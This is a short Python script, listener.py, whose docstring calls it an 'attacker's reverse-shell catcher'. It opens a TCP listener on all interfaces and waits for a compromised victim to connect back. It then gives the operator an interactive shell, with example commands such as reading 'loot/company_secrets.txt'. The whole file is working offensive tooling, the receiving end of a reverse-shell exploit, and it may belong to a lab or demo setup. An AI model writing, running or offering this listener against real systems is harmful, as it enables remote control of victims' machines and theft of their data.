#!/usr/bin/env python3
"""
listener.py  —  attacker's reverse-shell catcher
=================================================
Use this instead of `nc` so it works the same on every Mac/Linux.
Run it in your ATTACKER terminal, THEN fire the reverse-shell exploit.

  python3 listener.py 4444

When the victim connects back you get an interactive shell. Type commands
(whoami, ls, cat loot/company_secrets.txt) and press Enter. Ctrl+C to quit.
"""
import socket, threading, sys

port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", port))
srv.listen(1)
print(f"\033[91m[listener]\033[0m waiting for a shell on 0.0.0.0:{port} ...")

conn, addr = srv.accept()
print(f"\033[92m[listener] GOT SHELL from {addr[0]}:{addr[1]}\033[0m  (type commands below)\n")

def pump():
    while True:
        data = conn.recv(4096)
        if not data:
            print("\n[listener] connection closed.")
            break
        sys.stdout.write(data.decode("utf-8", "replace"))
        sys.stdout.flush()

threading.Thread(target=pump, daemon=True).start()

try:
    for line in sys.stdin:
        conn.sendall(line.encode())
except KeyboardInterrupt:
    pass
finally:
    conn.close()
